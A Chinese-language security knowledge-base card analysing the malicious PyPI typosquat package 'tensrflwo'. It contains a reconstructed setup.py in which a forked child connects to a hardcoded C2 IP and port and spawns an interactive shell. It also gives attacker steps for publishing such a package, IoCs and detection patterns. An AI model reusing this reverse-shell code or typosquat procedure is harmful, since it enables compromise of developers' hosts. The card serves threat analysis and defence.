---
id: cloud-cicd-pypi-typosquat-tensorflow-setup-py-fork-reverse-shell
title: PyPI 拼写仿冒 tensorflow（tensrflwo）：setup.py 顶层 taint2() fork 子进程 dup2 反弹 shell 到硬编码 C2
type: scenario
domain: cloud
path: cloud/ci-cd
technique: pypi-typosquat-setup-py-fork-dup2-reverse-shell
tags:
- supply-chain
- pypi
- typosquatting
- setup-py
- reverse-shell
- install-time
- python
- c2
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
affected_versions: tensrflwo [2.5.1 ~ 2.9]（PyPI 恶意包受影响版本，原文影响版本表标记 [2.5.1 ~ 2.9]；正文 OpenSCA 示例列为 2.5.1/2.7/2.7.1/2.8/2.9 五个离散版本）
verification:
  verified_by: verifier-V591
  verified_at: '2026-11-12T15:15:30+08:00'
  notes: 已对照原文全文与图01-09逐张核对：图02恶意包影响版本表明确标记 [2.5.1 ~ 2.9]（组件 tensrflwo-2.9.tar.gz），已据此设置 affected_versions；图05 setup.py 显示 taint()/test()/taint2() 完整代码（os.fork→test()→socket.connect 59.110.111.85:8088→dup2 0/1/2→subprocess.call(['/bin/sh','-i'])，/tmp/test1563.txt 标记），图06 清华/腾讯云镜像 pip install 复现，图07 nc 监听收到 root shell，图08 IoC（tensrflwo-2.9/setup.py、59.110.111.85、59.110.111.85:8088），图09 pip show tensrflwo 2.9。修正了卡片 PoC：原文标记文件由独立 taint() 创建（截图未展示调用位置），原卡误写为 test() 内部 open() 创建；已在 PoC 与原理中按截图还原并注明顶层调用为推断。dedup 报告 recommendation=new，6 张 related 候选（Fernet 分阶段加载/__init__ Base64 反弹/egg_info 无文件 shellcode/cmdclass 远程 Bash/npm install 反弹/Cookie 外带）机制均不同，非同链。未执行 PoC。
url: /docs/cloud/ci-cd/cloud-cicd-pypi-typosquat-tensorflow-setup-py-fork-reverse-shell/
draft: false
kb_aliases:
- tensrflwo
- tensorflow 拼写仿冒
- PyPI typo-squatting
- setup.py 反弹 shell
- pip install 触发反弹 shell
- taint2
---

# 一句话结论

把恶意包发布成与 `tensorflow` 相近的拼写 `tensrflwo`（typo-squatting），并在 `setup.py` 顶层直接调用 `taint2()`：该函数 `os.fork()` 出子进程，子进程用 `socket.connect` 连到硬编码的 `59.110.111.85:8088`，`dup2` 把 0/1/2 重定向到 socket 后 `subprocess.call(['/bin/sh','-i'])`；开发者只要执行 `pip install tensrflwo`（甚至 `pip download`），pip 为构建元数据执行 setup.py 时就会建立反向 shell，攻击者获得该主机交互式 shell。

# 原理

- **pip 会执行 setup.py**：源码包（sdist）没有预构建元数据时，pip 安装/下载阶段会执行 `setup.py`（PEP 517 之前的标准行为）来获取包名、版本与依赖，因此 setup.py 顶层的任意代码会在“安装”被确认之前执行。攻击者不需要等待用户 import 恶意模块。
- **typo-squatting 命中目标人群**：包名 `tensrflwo` 只是 `tensorflow` 的字母换位，AI 开发者手输 `pip install tensrflwo`（或从拼写错误的教程复制）就会中招；包描述、版本号（2.5.1~2.9）与 tensorflow 发行序列贴近，增加可信度。
- **fork + dup2 反弹 shell**：`taint2()` 先 `fork()`，父进程立即返回让 pip 继续正常安装（减少卡顿与怀疑）；子进程调 `test()`，检查 `/tmp/test1563.txt` 标记是否存在（存在则退出，避免重复连接），随后 `socket.connect` 到 C2，再用 `os.dup2` 把标准输入/输出/错误指向 socket，最后 `subprocess.call(['/bin/sh','-i'])` 启动交互式 shell。原文另定义 `taint()` 用 `os.system("touch /tmp/test1563.txt")` 创建该标记（截图只截到 `taint2()` 定义处，创建标记与顶层调用的具体位置未展示）。所有 fd 都绑定到 socket，攻击者端 `nc -lvp 8088` 即得到 shell。
- **硬编码 C2 的取舍**：实现简单、无需额外下载阶段；但 IP/端口写死在包里，易被静态查杀与封禁（本例 C2 为 59.110.111.85:8088）。
- **镜像源放大影响**：包从 PyPI 官方下架后，国内主流镜像（清华、腾讯云等）仍缓存并继续提供下载，受害者面进一步扩大。

# 触发条件

- 受害者执行 `pip install <恶意包名>` 或 `pip download <恶意包名>`，且环境允许执行 setup.py（非 `--only-binary` 二进制轮子、未强制禁用构建）。
- 受害者主机可出网访问攻击者 C2 的 IP/端口（本例 TCP 8088），无出站限制。
- 恶意包已发布在 PyPI 或仍被镜像源缓存；名称与热门包高度相似以诱导输错。
- 攻击者端提前监听对应端口。

# 利用步骤

1. 注册与目标热门库相近的包名（如 `tensrflwo`），版本号模仿官方发行序列。
2. 在 `setup.py` 顶层定义并调用恶意函数：`fork()` 子进程避免阻塞安装；子进程用 socket 连接 C2，`dup2` 重定向 stdio 后执行 `/bin/sh -i`；用临时文件标记防止重复反弹。
3. `python setup.py sdist` 构建源码包并上传 PyPI；等待镜像同步。
4. 攻击者服务器 `nc -lvp 8088` 监听。
5. 受害者误执行 `pip install tensrflwo`，setup.py 执行，子进程回连，攻击者获得受害者权限的交互式 shell。
6. 排查：`pip show tensrflwo` 确认是否安装；`pip uninstall tensrflwo -y` 卸载；按 IoC（包名、setup.py hash、C2 IP/端口）扫描项目与主机。

# PoC

原文截图（tensrflwo-2.9/setup.py）中的核心代码，按图还原，未执行：

```python
def taint():
    import os
    os.system("touch /tmp/test1563.txt")

def test():
    import socket
    import subprocess
    import os
    if os.path.exists("/tmp/test1563.txt"):
        return
    host = '59.110.111.85'
    port = 8088
    s = socket.socket()
    s.connect((host, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    p = subprocess.call(['/bin/sh', '-i'])

def taint2():
    pid = os.fork()
    if pid == 0:  # 子进程
        test()
    else:
        pass

# 截图止于 taint2() 定义（第 54 行），未展示 taint()/taint2() 的调用位置；
# 原文称 pip install/download 时恶意函数立即被调用执行，据此推断为 setup.py 顶层调用。
```

# 变体与关联

- 变体：用 `cmdclass={'install': CustomInstallCommand}` 或 `egg_info` 自定义命令挂接，安装期执行远程脚本/无文件 shellcode（见 `cloud-cicd-pypi-setup-py-custom-install-command-remote-bash`、`cloud-cicd-pypi-egg-info-multistage-fileless-shellcode`）。
- 变体：不在安装期反弹，而在 `__init__.py` 导入时执行 Base64 载荷并从云盘取 C2（见 `cloud-cicd-pypi-import-base64-reverse-shell-remote-c2`）。
- 关联：npm 生态的同类 install 脚本反向 shell 见 `cloud-cicd-npm-typosquat-install-powershell-reverse-shell`；PyPI 拼写抢注的其他载荷见 `cloud-cicd-pypi-typosquat-requests-cookie-exfil`、`cloud-cicd-pypi-fernet-encrypted-staged-loader`。
- 边界：`--only-binary=:all:`、离线/内网源、禁止执行 setup.py 的构建策略、出站白名单可阻断；C2 硬编码容易被封禁。

# 检测与防御

- 检测：`pip install` 期间出现 `python setup.py` 子进程对陌生 IP:端口的 TCP 连接；setup.py 中出现 `os.fork`、`socket.connect`、`os.dup2`、`subprocess.call(["/bin/sh","-i"])`、`/tmp/*.txt` 标记等组合；`pip show`/`pip list` 出现与热门包相近的陌生包名；镜像源仍可下载已下架恶意包。
- 防御：使用 `--only-binary=:all:` 或锁定哈希的 `requirements.txt`；依赖名拼写校验/白名单与私有源；pip 构建隔离（PEP 517 build isolation）并禁用不必要的 sdist 构建；出站白名单与 DNS 监控；供应链扫描（OpenSCA 等）与镜像源安全策略。
